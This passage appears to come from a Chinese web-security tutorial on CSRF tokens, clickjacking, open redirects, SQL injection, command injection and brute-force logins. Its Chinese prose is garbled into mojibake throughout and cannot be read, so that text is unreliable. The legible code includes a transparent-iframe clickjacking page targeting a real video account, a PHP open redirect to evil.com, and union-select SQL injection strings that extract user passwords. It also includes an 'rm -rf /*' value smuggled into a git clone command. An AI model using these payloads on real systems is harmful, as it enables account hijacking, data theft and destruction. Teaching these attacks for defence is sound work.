å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨æ¥éªŒè¯è¿™ä¸ªtokenã€‚æœåŠ¡å™¨è¯»å–æµè§ˆå™¨å½“å‰åŸŸcookieä¸­è¿™ä¸ªtokenå€¼ï¼Œä¼šè¿›è¡Œæ ¡éªŒè¯¥è¯·æ±‚å½“ä¸­çš„tokenå’Œcookieå½“ä¸­çš„tokenå€¼æ˜¯å¦éƒ½å­˜åœ¨ä¸”ç›¸ç­‰ï¼Œæ‰è®¤ä¸ºè¿™æ˜¯åˆæ³•çš„è¯·æ±‚ã€‚å¦åˆ™è®¤ä¸ºè¿™æ¬¡è¯·æ±‚æ˜¯è¿æ³•çš„ï¼Œæ‹’ç»è¯¥æ¬¡æœåŠ¡ã€‚ è¿™ç§æ–¹æ³•ç›¸æ¯”Refereræ£€æŸ¥è¦å®‰å…¨å¾ˆå¤šï¼Œtokenå¯ä»¥åœ¨ç”¨æˆ·ç™»é™†åŽäº§ç”Ÿå¹¶æ”¾äºŽsessionæˆ–cookieä¸­ï¼Œç„¶åŽåœ¨æ¯æ¬¡è¯·æ±‚æ—¶æœåŠ¡å™¨æŠŠtokenä»Žsessionæˆ–cookieä¸­æ‹¿å‡ºï¼Œä¸Žæœ¬æ¬¡è¯·æ±‚ä¸­çš„token è¿›è¡Œæ¯”å¯¹ã€‚ç”±äºŽtokençš„å­˜åœ¨ï¼Œæ”»å‡»è€…æ— æ³•å†æž„é€ å‡ºä¸€ä¸ªå®Œæ•´çš„URLå®žæ–½CSRFæ”»å‡»ã€‚ä½†åœ¨å¤„ç†å¤šä¸ªé¡µé¢å…±å­˜é—®é¢˜æ—¶ï¼Œå½“æŸä¸ªé¡µé¢æ¶ˆè€—æŽ‰tokenåŽï¼Œå…¶ä»–é¡µé¢çš„è¡¨å•ä¿å­˜çš„è¿˜æ˜¯è¢«æ¶ˆè€—æŽ‰çš„é‚£ä¸ªtokenï¼Œå…¶ä»–é¡µé¢çš„è¡¨å•æäº¤æ—¶ä¼šå‡ºçŽ°tokené”™è¯¯ã€‚ é˜²èŒƒ tokenï¼šæœåŠ¡ç«¯é¢„å…ˆç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œåœ¨æ¸²æŸ“å…·æœ‰è¡¨å•çš„é¡µé¢æ—¶å°†éšæœºæ•°ä»¥ä¸å¯è§çš„å½¢å¼( visible:hidden )æ’å…¥åˆ°è¡¨å•åŸŸï¼Œå®¢æˆ·ç«¯è¯·æ±‚æ—¶å¸¦ä¸Šè¿™ä¸ªéšæœºæ•°ï¼ŒæœåŠ¡ç«¯è¿›è¡Œæ ¡éªŒï¼Œç¡®å®šè¯·æ±‚ç¡®å®žæ¥è‡ªè¯¥é¡µé¢ã€‚ å¯¹äºŽBç½‘ç«™ï¼Œå³ä½¿è¯·æ±‚ä¼šå¸¦ä¸Šcookieï¼Œä¹Ÿç”±äºŽèŽ·å–ä¸åˆ°è¯¥éšæœºæ•°ï¼ˆè¯¥éšæœºæ•°æ¯æ¬¡åˆ·æ–°é¡µé¢éƒ½ä¸ä¸€è‡´ï¼‰ï¼Œå¯¼è‡´åŽç«¯æ ¡éªŒå¤±è´¥ã€‚ 4) éªŒè¯ç  åº”ç”¨ç¨‹åºå’Œç”¨æˆ·è¿›è¡Œäº¤äº’è¿‡ç¨‹ä¸­ï¼Œç‰¹åˆ«æ˜¯è´¦æˆ·äº¤æ˜“è¿™ç§æ ¸å¿ƒæ­¥éª¤ï¼Œå¼ºåˆ¶ç”¨æˆ·è¾“å…¥éªŒè¯ç ï¼Œæ‰èƒ½å®Œæˆæœ€ç»ˆè¯·æ±‚ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼ŒéªŒè¯ç å¤Ÿå¾ˆå¥½åœ°éåˆ¶CSRFæ”»å‡»ã€‚ä½†å¢žåŠ éªŒè¯ç é™ä½Žäº†ç”¨æˆ·çš„ä½“éªŒï¼Œç½‘ç«™ä¸èƒ½ç»™æ‰€æœ‰çš„æ“ä½œéƒ½åŠ ä¸ŠéªŒè¯ç ã€‚æ‰€ä»¥åªèƒ½å°†éªŒè¯ç ä½œä¸ºä¸€ç§è¾…åŠ©æ‰‹æ®µï¼Œåœ¨å…³é”®ä¸šåŠ¡ç‚¹è®¾ç½®éªŒè¯ç ã€‚ ä¸‰ã€ç‚¹å‡»åŠ«æŒç‚¹å‡»åŠ«æŒæ˜¯ä¸€ç§è§†è§‰æ¬ºéª—çš„æ”»å‡»æ‰‹æ®µã€‚æ”»å‡»è€…å°†éœ€è¦æ”»å‡»çš„ç½‘ç«™é€šè¿‡ iframe åµŒå¥—çš„æ–¹å¼åµŒå…¥è‡ªå·±çš„ç½‘é¡µä¸­ï¼Œå¹¶å°† iframe è®¾ç½®ä¸ºé€æ˜Žï¼Œåœ¨é¡µé¢ä¸­é€å‡ºä¸€ä¸ªæŒ‰é’®è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ã€‚ 1. ç‰¹ç‚¹ éšè”½æ€§è¾ƒé«˜ï¼Œéª—å–ç”¨æˆ·æ“ä½œ â€œUI-è¦†ç›–æ”»å‡»â€ åˆ©ç”¨iframeæˆ–è€…å…¶å®ƒæ ‡ç­¾çš„å±žæ€§ 2. ç‚¹å‡»åŠ«æŒçš„åŽŸç†ç”¨æˆ·åœ¨ç™»é™† A ç½‘ç«™çš„ç³»ç»ŸåŽï¼Œè¢«æ”»å‡»è€…è¯±æƒ‘æ‰“å¼€ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œè€Œç¬¬ä¸‰æ–¹ç½‘ç«™é€šè¿‡ iframe å¼•å…¥äº† A ç½‘ç«™çš„é¡µé¢å†…å®¹ï¼Œç”¨æˆ·åœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ä¸­ç‚¹å‡»æŸä¸ªæŒ‰é’®ï¼ˆè¢«è£…é¥°çš„æŒ‰é’®ï¼‰ï¼Œå®žé™…ä¸Šæ˜¯ç‚¹å‡»äº† A ç½‘ç«™çš„æŒ‰é’®ã€‚æŽ¥ä¸‹æ¥æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­ï¼šæˆ‘åœ¨ä¼˜é…·å‘å¸ƒäº†å¾ˆå¤šè§†é¢‘ï¼Œæƒ³è®©æ›´å¤šçš„äººå…³æ³¨å®ƒï¼Œå°±å¯ä»¥é€šè¿‡ç‚¹å‡»åŠ«æŒæ¥å®žçŽ° 123456789101112131415161718192021222324iframe &#123;width: 1440px;height: 900px;position: absolute;top: -0px;left: -0px;z-index: 2;-moz-opacity: 0;opacity: 0;filter: alpha(opacity=0);&#125;button &#123;position: absolute;top: 270px;left: 1150px;z-index: 1;width: 90px;height:40px;&#125;&lt;/style&gt;......&lt;button&gt;ç‚¹å‡»è„±è¡£&lt;/button&gt;&lt;img src="http://pic1.win4000.com/wallpaper/2018-03-19/5aaf2bf0122d2.jpg"&gt;&lt;iframe src="http://i.youku.com/u/UMjA0NTg4Njcy" scrolling="no"&gt;&lt;/iframe&gt; ä»Žä¸Šå›¾å¯çŸ¥ï¼Œæ”»å‡»è€…é€šè¿‡å›¾ç‰‡ä½œä¸ºé¡µé¢èƒŒæ™¯ï¼Œéšè—äº†ç”¨æˆ·æ“ä½œçš„çœŸå®žç•Œé¢ï¼Œå½“ä½ æŒ‰è€ä¸ä½å¥½å¥‡ç‚¹å‡»æŒ‰é’®ä»¥åŽï¼ŒçœŸæ­£çš„ç‚¹å‡»çš„å…¶å®žæ˜¯éšè—çš„é‚£ä¸ªé¡µé¢çš„è®¢é˜…æŒ‰é’®ï¼Œç„¶åŽå°±ä¼šåœ¨ä½ ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è®¢é˜…äº†ã€‚ 3. å¦‚ä½•é˜²å¾¡1ï¼‰X-FRAME-OPTIONS X-FRAME-OPTIONSæ˜¯ä¸€ä¸ª HTTP å“åº”å¤´ï¼Œåœ¨çŽ°ä»£æµè§ˆå™¨æœ‰ä¸€ä¸ªå¾ˆå¥½çš„æ”¯æŒã€‚è¿™ä¸ª HTTP å“åº”å¤´ å°±æ˜¯ä¸ºäº†é˜²å¾¡ç”¨ iframe åµŒå¥—çš„ç‚¹å‡»åŠ«æŒæ”»å‡»ã€‚ è¯¥å“åº”å¤´æœ‰ä¸‰ä¸ªå€¼å¯é€‰ï¼Œåˆ†åˆ«æ˜¯ DENYï¼Œè¡¨ç¤ºé¡µé¢ä¸å…è®¸é€šè¿‡ iframe çš„æ–¹å¼å±•ç¤º SAMEORIGINï¼Œè¡¨ç¤ºé¡µé¢å¯ä»¥åœ¨ç›¸åŒåŸŸåä¸‹é€šè¿‡ iframe çš„æ–¹å¼å±•ç¤º ALLOW-FROMï¼Œè¡¨ç¤ºé¡µé¢å¯ä»¥åœ¨æŒ‡å®šæ¥æºçš„ iframe ä¸­å±•ç¤º 2ï¼‰JavaScript é˜²å¾¡ å¯¹äºŽæŸäº›è¿œå¤æµè§ˆå™¨æ¥è¯´ï¼Œå¹¶ä¸èƒ½æ”¯æŒä¸Šé¢çš„è¿™ç§æ–¹å¼ï¼Œé‚£æˆ‘ä»¬åªæœ‰é€šè¿‡ JS çš„æ–¹å¼æ¥é˜²å¾¡ç‚¹å‡»åŠ«æŒäº†ã€‚ 1234567891011121314151617&lt;head&gt; &lt;style id="click-jack"&gt; html &#123; display: none !important; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; if (self == top) &#123; var style = document.getElementById('click-jack') document.body.removeChild(style) &#125; else &#123; top.location = self.location &#125; &lt;/script&gt;&lt;/body&gt; ä»¥ä¸Šä»£ç çš„ä½œç”¨å°±æ˜¯å½“é€šè¿‡ iframe çš„æ–¹å¼åŠ è½½é¡µé¢æ—¶ï¼Œæ”»å‡»è€…çš„ç½‘é¡µç›´æŽ¥ä¸æ˜¾ç¤ºæ‰€æœ‰å†…å®¹äº†ã€‚ ç»™å¤§å®¶æŽ¨èä¸€ä¸ªå¥½ç”¨çš„BUGç›‘æŽ§å·¥å…·Fundebugï¼Œæ¬¢è¿Žå…è´¹è¯•ç”¨ï¼ å››ã€URLè·³è½¬æ¼æ´žå®šä¹‰ï¼šå€ŸåŠ©æœªéªŒè¯çš„URLè·³è½¬ï¼Œå°†åº”ç”¨ç¨‹åºå¼•å¯¼åˆ°ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹åŒºåŸŸï¼Œä»Žè€Œå¯¼è‡´çš„å®‰å…¨é—®é¢˜ã€‚ 1.URLè·³è½¬æ¼æ´žåŽŸç†é»‘å®¢åˆ©ç”¨URLè·³è½¬æ¼æ´žæ¥è¯±å¯¼å®‰å…¨æ„è¯†ä½Žçš„ç”¨æˆ·ç‚¹å‡»ï¼Œå¯¼è‡´ç”¨æˆ·ä¿¡æ¯æ³„éœ²æˆ–è€…èµ„é‡‘çš„æµå¤±ã€‚å…¶åŽŸç†æ˜¯é»‘å®¢æž„å»ºæ¶æ„é“¾æŽ¥(é“¾æŽ¥éœ€è¦è¿›è¡Œä¼ªè£…,å°½å¯èƒ½è¿·æƒ‘),å‘åœ¨QQç¾¤æˆ–è€…æ˜¯æµè§ˆé‡å¤šçš„è´´å§/è®ºå›ä¸­ã€‚å®‰å…¨æ„è¯†ä½Žçš„ç”¨æˆ·ç‚¹å‡»åŽ,ç»è¿‡æœåŠ¡å™¨æˆ–è€…æµè§ˆå™¨è§£æžåŽï¼Œè·³åˆ°æ¶æ„çš„ç½‘ç«™ä¸­ã€‚ æ¶æ„é“¾æŽ¥éœ€è¦è¿›è¡Œä¼ªè£…,ç»å¸¸çš„åšæ³•æ˜¯ç†Ÿæ‚‰çš„é“¾æŽ¥åŽé¢åŠ ä¸Šä¸€ä¸ªæ¶æ„çš„ç½‘å€ï¼Œè¿™æ ·æ‰è¿·æƒ‘ç”¨æˆ·ã€‚ è¯¸å¦‚ä¼ªè£…æˆåƒå¦‚ä¸‹çš„ç½‘å€ï¼Œä½ æ˜¯å¦èƒ½å¤Ÿè¯†åˆ«å‡ºæ¥æ˜¯æ¶æ„ç½‘å€å‘¢ï¼Ÿ 123http://gate.baidu.com/index?act=go&amp;url=http://t.cn/RVTatrdhttp://qt.qq.com/safecheck.html?flag=1&amp;url=http://t.cn/RVTatrdhttp://tieba.baidu.com/f/user/passport?jumpUrl=http://t.cn/RVTatrd 2.å®žçŽ°æ–¹å¼ï¼š Headerå¤´è·³è½¬ Javascriptè·³è½¬ METAæ ‡ç­¾è·³è½¬ è¿™é‡Œæˆ‘ä»¬ä¸¾ä¸ªHeaderå¤´è·³è½¬å®žçŽ°æ–¹å¼ï¼š 12345&lt;?php$url=$_GET['jumpto'];header("Location: $url");?&gt;http://www.wooyun.org/login.php?jumpto=http://www.evil.com è¿™é‡Œç”¨æˆ·ä¼šè®¤ä¸ºwww.wooyun.orgéƒ½æ˜¯å¯ä¿¡çš„ï¼Œä½†æ˜¯ç‚¹å‡»ä¸Šè¿°é“¾æŽ¥å°†å¯¼è‡´ç”¨æˆ·æœ€ç»ˆè®¿é—®www.evil.comè¿™ä¸ªæ¶æ„ç½‘å€ã€‚ 3.å¦‚ä½•é˜²å¾¡1)refererçš„é™åˆ¶ å¦‚æžœç¡®å®šä¼ é€’URLå‚æ•°è¿›å…¥çš„æ¥æºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥æ–¹å¼å®žçŽ°å®‰å…¨é™åˆ¶ï¼Œä¿è¯è¯¥URLçš„æœ‰æ•ˆæ€§ï¼Œé¿å…æ¶æ„ç”¨æˆ·è‡ªå·±ç”Ÿæˆè·³è½¬é“¾æŽ¥ 2)åŠ å…¥æœ‰æ•ˆæ€§éªŒè¯Token æˆ‘ä»¬ä¿è¯æ‰€æœ‰ç”Ÿæˆçš„é“¾æŽ¥éƒ½æ˜¯æ¥è‡ªäºŽæˆ‘ä»¬å¯ä¿¡åŸŸçš„ï¼Œé€šè¿‡åœ¨ç”Ÿæˆçš„é“¾æŽ¥é‡ŒåŠ å…¥ç”¨æˆ·ä¸å¯æŽ§çš„Tokenå¯¹ç”Ÿæˆçš„é“¾æŽ¥è¿›è¡Œæ ¡éªŒï¼Œå¯ä»¥é¿å…ç”¨æˆ·ç”Ÿæˆè‡ªå·±çš„æ¶æ„é“¾æŽ¥ä»Žè€Œè¢«åˆ©ç”¨ï¼Œä½†æ˜¯å¦‚æžœåŠŸèƒ½æœ¬èº«è¦æ±‚æ¯”è¾ƒå¼€æ”¾ï¼Œå¯èƒ½å¯¼è‡´æœ‰ä¸€å®šçš„é™åˆ¶ã€‚ äº”ã€SQLæ³¨å…¥SQLæ³¨å…¥æ˜¯ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´žï¼Œæ”»å‡»è€…åˆ©ç”¨è¿™ä¸ªæ¼æ´žï¼Œå¯ä»¥è®¿é—®æˆ–ä¿®æ”¹æ•°æ®ï¼Œæˆ–è€…åˆ©ç”¨æ½œåœ¨çš„æ•°æ®åº“æ¼æ´žè¿›è¡Œæ”»å‡»ã€‚ 1.SQLæ³¨å…¥çš„åŽŸç†æˆ‘ä»¬å…ˆä¸¾ä¸€ä¸ªä¸‡èƒ½é’¥åŒ™çš„ä¾‹å­æ¥è¯´æ˜Žå…¶åŽŸç†ï¼š 12345&lt;form action="/login" method="POST"&gt; &lt;p&gt;Username: &lt;input type="text" name="username" /&gt;&lt;/p&gt; &lt;p&gt;Password: &lt;input type="password" name="password" /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type="submit" value="ç™»é™†" /&gt;&lt;/p&gt;&lt;/form&gt; åŽç«¯çš„ SQL è¯­å¥å¯èƒ½æ˜¯å¦‚ä¸‹è¿™æ ·çš„ï¼š 1234567let querySQL = ` SELECT * FROM user WHERE username='$&#123;username&#125;' AND psw='$&#123;password&#125;'`;// æŽ¥ä¸‹æ¥å°±æ˜¯æ‰§è¡Œ sql è¯­å¥... è¿™æ˜¯æˆ‘ä»¬ç»å¸¸è§åˆ°çš„ç™»å½•é¡µé¢ï¼Œä½†å¦‚æžœæœ‰ä¸€ä¸ªæ¶æ„æ”»å‡»è€…è¾“å…¥çš„ç”¨æˆ·åæ˜¯ admin&#39; --ï¼Œå¯†ç éšæ„è¾“å…¥ï¼Œå°±å¯ä»¥ç›´æŽ¥ç™»å…¥ç³»ç»Ÿäº†ã€‚why! â€”-è¿™å°±æ˜¯SQLæ³¨å…¥ æˆ‘ä»¬ä¹‹å‰é¢„æƒ³çš„SQL è¯­å¥æ˜¯: 1SELECT * FROM user WHERE username='admin' AND psw='password' ä½†æ˜¯æ¶æ„æ”»å‡»è€…ç”¨å¥‡æ€ªç”¨æˆ·åå°†ä½ çš„ SQL è¯­å¥å˜æˆäº†å¦‚ä¸‹å½¢å¼ï¼š 1SELECT * FROM user WHERE username='admin' --' AND psw='xxxx' åœ¨ SQL ä¸­,&#39; --æ˜¯é—­åˆå’Œæ³¨é‡Šçš„æ„æ€ï¼Œâ€“ æ˜¯æ³¨é‡ŠåŽé¢çš„å†…å®¹çš„æ„æ€ï¼Œæ‰€ä»¥æŸ¥è¯¢è¯­å¥å°±å˜æˆäº†ï¼š 1SELECT * FROM user WHERE username='admin' æ‰€è°“çš„ä¸‡èƒ½å¯†ç ,æœ¬è´¨ä¸Šå°±æ˜¯SQLæ³¨å…¥çš„ä¸€ç§åˆ©ç”¨æ–¹å¼ã€‚ ä¸€æ¬¡SQLæ³¨å…¥çš„è¿‡ç¨‹åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªè¿‡ç¨‹ï¼š èŽ·å–ç”¨æˆ·è¯·æ±‚å‚æ•° æ‹¼æŽ¥åˆ°ä»£ç å½“ä¸­ SQLè¯­å¥æŒ‰ç…§æˆ‘ä»¬æž„é€ å‚æ•°çš„è¯­ä¹‰æ‰§è¡ŒæˆåŠŸ SQLæ³¨å…¥çš„å¿…å¤‡æ¡ä»¶ï¼š1.å¯ä»¥æŽ§åˆ¶è¾“å…¥çš„æ•°æ®2.æœåŠ¡å™¨è¦æ‰§è¡Œçš„ä»£ç æ‹¼æŽ¥äº†æŽ§åˆ¶çš„æ•°æ®ã€‚ æˆ‘ä»¬ä¼šå‘çŽ°SQLæ³¨å…¥æµç¨‹ä¸­ä¸Žæ­£å¸¸è¯·æ±‚æœåŠ¡å™¨ç±»ä¼¼ï¼Œåªæ˜¯é»‘å®¢æŽ§åˆ¶äº†æ•°æ®ï¼Œæž„é€ äº†SQLæŸ¥è¯¢ï¼Œè€Œæ­£å¸¸çš„è¯·æ±‚ä¸ä¼šSQLæŸ¥è¯¢è¿™ä¸€æ­¥ï¼ŒSQLæ³¨å…¥çš„æœ¬è´¨:æ•°æ®å’Œä»£ç æœªåˆ†ç¦»ï¼Œå³æ•°æ®å½“åšäº†ä»£ç æ¥æ‰§è¡Œã€‚ å‡å¦‚ç½‘ç«™åŽç«¯ä»£ç å¦‚ä¸‹ï¼š 12$id = $_REQUEST[ &apos;id&apos; ];&quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; å³ å°†èŽ·å¾—idå‚æ•°å€¼ï¼Œç»„åˆæˆSQLè¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼Œé‚£ä¹ˆå°±å­˜åœ¨SQLæ³¨å…¥çš„é£Žé™©ã€‚ æ”»å‡»è€…é€šè¿‡å°† id å‚æ•°è®¾ç½®ä¸º 1â€™orâ€™1â€™=â€™1 ã€‚â€™æˆ–â€™ è¯­æ³•ä½¿å¾— WHERE æ¡ä»¶ä¸€ç›´æˆç«‹ï¼Œç»“æžœèƒ½æŸ¥è¯¢å‡ºusersè¡¨çš„æ‰€æœ‰æ•°æ®ã€‚ id è®¾ç½®ä¸º 1â€™ order by n # ï¼Œè¦æ±‚ç»“æžœä»¥è¡¨çš„ç¬¬nä¸ªå­—æ®µæŽ’åºï¼Œåˆ™å½“n = 1,2,3â€¦ä¾æ¬¡æ‰§è¡Œï¼Œå‡ºçŽ°æŠ¥é”™æ—¶å‡è®¾n=5ï¼Œå³è¯´æ˜Žè¯¥è¡¨åªæœ‰4ä¸ªå­—æ®µã€‚ é€šè¿‡ä»¥ä¸‹ sql èƒ½æŒ–æŽ˜å‡ºæ›´å¤šçš„æ•°æ®åº“ä¿¡æ¯ã€‚ 1234567891011121314æŸ¥è¯¢æ•°æ®åº“ç”¨æˆ·ï¼Œç‰ˆæœ¬ä¿¡æ¯:1&apos; union select 1,concat(database(),version(),user()) #æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“åå­—:1&apos; union select 1,schema_name from information_schema.schemata #æŸ¥è¯¢æ•°æ®åº“çš„è¡¨åï¼Œ0x64767761åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸º dvwa:&apos; union select 1,table_name from information_schema.tables where table_schema=0x64767761 #æŸ¥è¯¢è¡¨çš„å­—æ®µï¼Œ0x7573657273åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸º users:&apos; union select 1,column_name from information_schema.columns where table_name=0x7573657273 #æŸ¥çœ‹è¡¨çš„å†…å®¹:&apos; union select user,password from users # 2.å±å®³ èŽ·å–æ•°æ®åº“ä¿¡æ¯ ç®¡ç†å‘˜åŽå°ç”¨æˆ·åå’Œå¯†ç  èŽ·å–å…¶ä»–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ï¼šç”¨æˆ·åã€å¯†ç ã€æ‰‹æœºå·ç ã€èº«ä»½è¯ã€é“¶è¡Œå¡ä¿¡æ¯â€¦â€¦ æ•´ä¸ªæ•°æ®åº“ï¼šè„±è£¤ èŽ·å–æœåŠ¡å™¨æƒé™ æ¤å…¥Webshellï¼ŒèŽ·å–æœåŠ¡å™¨åŽé—¨ è¯»å–æœåŠ¡å™¨æ•æ„Ÿæ–‡ä»¶ 3.å¦‚ä½•é˜²å¾¡ ä¸¥æ ¼é™åˆ¶Webåº”ç”¨çš„æ•°æ®åº“çš„æ“ä½œæƒé™ï¼Œç»™æ­¤ç”¨æˆ·æä¾›ä»…ä»…èƒ½å¤Ÿæ»¡è¶³å…¶å·¥ä½œçš„æœ€ä½Žæƒé™ï¼Œä»Žè€Œæœ€å¤§é™åº¦çš„å‡å°‘æ³¨å…¥æ”»å‡»å¯¹æ•°æ®åº“çš„å±å®³ åŽç«¯ä»£ç æ£€æŸ¥è¾“å…¥çš„æ•°æ®æ˜¯å¦ç¬¦åˆé¢„æœŸï¼Œä¸¥æ ¼é™åˆ¶å˜é‡çš„ç±»åž‹ï¼Œä¾‹å¦‚ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œä¸€äº›åŒ¹é…å¤„ç†ã€‚ å¯¹è¿›å…¥æ•°æ®åº“çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆâ€™ï¼Œâ€ï¼Œï¼Œ&lt;ï¼Œ&gt;ï¼Œ&amp;ï¼Œ*ï¼Œ; ç­‰ï¼‰è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œæˆ–ç¼–ç è½¬æ¢ã€‚åŸºæœ¬ä¸Šæ‰€æœ‰çš„åŽç«¯è¯­è¨€éƒ½æœ‰å¯¹å­—ç¬¦ä¸²è¿›è¡Œè½¬ä¹‰å¤„ç†çš„æ–¹æ³•ï¼Œæ¯”å¦‚ lodash çš„ lodash._escapehtmlchar åº“ã€‚ æ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥å»ºè®®ä½¿ç”¨æ•°æ®åº“æä¾›çš„å‚æ•°åŒ–æŸ¥è¯¢æŽ¥å£ï¼Œå‚æ•°åŒ–çš„è¯­å¥ä½¿ç”¨å‚æ•°è€Œä¸æ˜¯å°†ç”¨æˆ·è¾“å…¥å˜é‡åµŒå…¥åˆ° SQL è¯­å¥ä¸­ï¼Œå³ä¸è¦ç›´æŽ¥æ‹¼æŽ¥ SQL è¯­å¥ã€‚ä¾‹å¦‚ Node.js ä¸­çš„ mysqljs åº“çš„ query æ–¹æ³•ä¸­çš„ ? å ä½å‚æ•°ã€‚ å…­ã€OSå‘½ä»¤æ³¨å…¥æ”»å‡»OSå‘½ä»¤æ³¨å…¥å’ŒSQLæ³¨å…¥å·®ä¸å¤šï¼Œåªä¸è¿‡SQLæ³¨å…¥æ˜¯é’ˆå¯¹æ•°æ®åº“çš„ï¼Œè€ŒOSå‘½ä»¤æ³¨å…¥æ˜¯é’ˆå¯¹æ“ä½œç³»ç»Ÿçš„ã€‚OSå‘½ä»¤æ³¨å…¥æ”»å‡»æŒ‡é€šè¿‡Webåº”ç”¨ï¼Œæ‰§è¡Œéžæ³•çš„æ“ä½œç³»ç»Ÿå‘½ä»¤è¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚åªè¦åœ¨èƒ½è°ƒç”¨Shellå‡½æ•°çš„åœ°æ–¹å°±æœ‰å­˜åœ¨è¢«æ”»å‡»çš„é£Žé™©ã€‚å€˜è‹¥è°ƒç”¨Shellæ—¶å­˜åœ¨ç–æ¼ï¼Œå°±å¯ä»¥æ‰§è¡Œæ’å…¥çš„éžæ³•å‘½ä»¤ã€‚ å‘½ä»¤æ³¨å…¥æ”»å‡»å¯ä»¥å‘Shellå‘é€å‘½ä»¤ï¼Œè®©Windowsæˆ–Linuxæ“ä½œç³»ç»Ÿçš„å‘½ä»¤è¡Œå¯åŠ¨ç¨‹åºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡å‘½ä»¤æ³¨å…¥æ”»å‡»å¯æ‰§è¡Œæ“ä½œç³»ç»Ÿä¸Šå®‰è£…ç€çš„å„ç§ç¨‹åºã€‚ 1.åŽŸç† é»‘å®¢æž„é€ å‘½ä»¤æäº¤ç»™webåº”ç”¨ç¨‹åºï¼Œwebåº”ç”¨ç¨‹åºæå–é»‘å®¢æž„é€ çš„å‘½ä»¤ï¼Œæ‹¼æŽ¥åˆ°è¢«æ‰§è¡Œçš„å‘½ä»¤ä¸­ï¼Œå› é»‘å®¢æ³¨å…¥çš„å‘½ä»¤æ‰“ç ´äº†åŽŸæœ‰å‘½ä»¤ç»“æž„ï¼Œå¯¼è‡´webåº”ç”¨æ‰§è¡Œäº†é¢å¤–çš„å‘½ä»¤ï¼Œæœ€åŽwebåº”ç”¨ç¨‹åºå°†æ‰§è¡Œçš„ç»“æžœè¾“å‡ºåˆ°å“åº”é¡µé¢ä¸­ã€‚ æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜Žå…¶åŽŸç†ï¼Œå‡å¦‚éœ€è¦å®žçŽ°ä¸€ä¸ªéœ€æ±‚ï¼šç”¨æˆ·æäº¤ä¸€äº›å†…å®¹åˆ°æœåŠ¡å™¨ï¼Œç„¶åŽåœ¨æœåŠ¡å™¨æ‰§è¡Œä¸€äº›ç³»ç»Ÿå‘½ä»¤åŽ»è¿”å›žä¸€ä¸ªç»“æžœç»™ç”¨æˆ· 1234// ä»¥ Node.js ä¸ºä¾‹ï¼Œå‡å¦‚åœ¨æŽ¥å£ä¸­éœ€è¦ä»Ž github ä¸‹è½½ç”¨æˆ·æŒ‡å®šçš„ repoconst exec = require('mz/child_process').exec;let params = &#123;/* ç”¨æˆ·è¾“å…¥çš„å‚æ•° */&#125;;exec(`git clone $&#123;params.repo&#125; /some/path`); å¦‚æžœ params.repo ä¼ å…¥çš„æ˜¯ https://github.com/admin/admin.github.io.git ç¡®å®žèƒ½ä»ŽæŒ‡å®šçš„ git repo ä¸Šä¸‹è½½åˆ°æƒ³è¦çš„ä»£ç ã€‚ä½†æ˜¯å¦‚æžœ params.repo ä¼ å…¥çš„æ˜¯ https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp; æ°å¥½ä½ çš„æœåŠ¡æ˜¯ç”¨ root æƒé™èµ·çš„å°±ç³Ÿç³•äº†ã€‚ 2.å¦‚ä½•é˜²å¾¡ åŽç«¯å¯¹å‰ç«¯æäº¤å†…å®¹è¿›è¡Œè§„åˆ™é™åˆ¶ï¼ˆæ¯”å¦‚æ­£åˆ™è¡¨è¾¾å¼ï¼‰ã€‚ åœ¨è°ƒç”¨ç³»ç»Ÿå‘½ä»¤å‰å¯¹æ‰€æœ‰ä¼ å…¥å‚æ•°è¿›è¡Œå‘½ä»¤è¡Œå‚æ•°è½¬ä¹‰è¿‡æ»¤ã€‚ ä¸è¦ç›´æŽ¥æ‹¼æŽ¥å‘½ä»¤è¯­å¥ï¼Œå€ŸåŠ©ä¸€äº›å·¥å…·åšæ‹¼æŽ¥ã€è½¬ä¹‰é¢„å¤„ç†ï¼Œä¾‹å¦‚ Node.js çš„ shell-escape npmåŒ… æš´åŠ›ç ´è§£æœ¬è´¨ä¸Šå°±æ˜¯å°†å¯†ç å­—å…¸çš„æ¯ä¸€ç§æƒ…å†µï¼Œé€šè¿‡è‡ªåŠ¨åŒ–å·¥å…·è¿›è¡Œç»„åˆå°è¯•ï¼Œè¿›è€Œå¾—åˆ°å¯†ç å­—å…¸ä¸­æ­£ç¡®çš„ä¸€é¡¹ã€‚ æ¼”ç¤ºç™»å½•ç ´è§£ - å®‰è£…Burp Suiteï¼ˆä»¥ä¸‹ç®€ç§°BSï¼‰,è®¾ç½®ä»£ç†ï¼Œä½¿å¾— BS èƒ½å¤Ÿæ‹¦æˆªæµè§ˆå™¨è¯·æ±‚ï¼Œæ•èŽ·ç™»å½•çš„æ•°æ®åŒ…ã€‚ - è¿›å…¥å¾…ç ´è§£ç½‘ç«™Aï¼ŒBSå¼€å¯æ‹¦æˆªï¼Œè¾“å…¥è´¦å·å¯†ç 